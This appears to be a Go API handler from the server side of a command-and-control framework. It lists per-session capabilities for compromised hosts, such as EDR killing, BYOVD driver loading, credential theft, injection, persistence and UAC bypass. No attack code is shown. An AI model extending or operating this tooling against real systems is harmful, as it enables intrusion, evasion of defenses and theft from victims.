package api

import (
	"encoding/json"
	"net/http"
	"strings"

	"github.com/gorilla/mux"
)

// ─── 会话能力清单接口 ────────────────────────────────────────────────
// GET /api/v1/sessions/{id}/capabilities
// 返回该会话可用功能列表（按 OS + 通道 + 档案推导），前端据此渲染操作面板。
// 避免 Linux/macOS 会话显示 Windows-only 的注入/截图/凭据等入口。

// sessionCapabilitiesHandler 返回会话可用功能清单。
func (s *Server) sessionCapabilitiesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	sess, err := s.sessionMgr.Get(id)
	if err != nil || sess == nil || sess.Info == nil {
		http.Error(w, `{"error":"Session not found"}`, http.StatusNotFound)
		return
	}
	info := sess.Info

	osName := strings.ToLower(info.OS)
	isWin := strings.Contains(osName, "windows")
	isUnix := strings.Contains(osName, "linux") || strings.Contains(osName, "darwin")

	// 基础能力（全平台）
	features := []string{
		"command", "file_list", "file_download", "file_upload", "file_delete",
		"process_list", "process_kill", "shell", "sysinfo", "netstat",
	}

	if isWin {
		// Windows 专属
		features = append(features,
			"process_inject", "process_spoof", "auto_inject", "injection", "spawn",
			"fileless_exec", "persistence", "credentials", "screenshot", "screen_stream",
			"av_detect", "edr_blind", "edr_kill", "byovd_load", "byovd_unload", "ppl_kill",
			"privesc_uac", "bof_load",
		)
	}
	if isUnix {
		// Unix 通用
		features = append(features,
			"fileless_exec", "bof_load", "plugin_exe", "plugin_dll", "plugin_shellcode",
		)
	}

	// 中继能力（所有会话都可作为中继，取决于是否已启动）
	features = append(features, "relay")

	// 可用操作面板（与前端 TABS 对齐）
	tabs := map[string]bool{
		"info": true, "files": true, "process": true, "shell": true,
		"bof": true, "relay": true,
	}
	if isWin {
		tabs["injection"] = true
		tabs["persistence"] = true
		tabs["screenshot"] = true
		tabs["credentials"] = true
		tabs["av"] = true
		tabs["fileless"] = true
		tabs["screenstream"] = true
	}
	if isUnix {
		tabs["fileless"] = true
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"session_id": id,
		"os":         info.OS,
		"arch":       info.Arch,
		"listener":   info.Listener,
		"features":   features,
		"tabs":       tabs,
	})
}
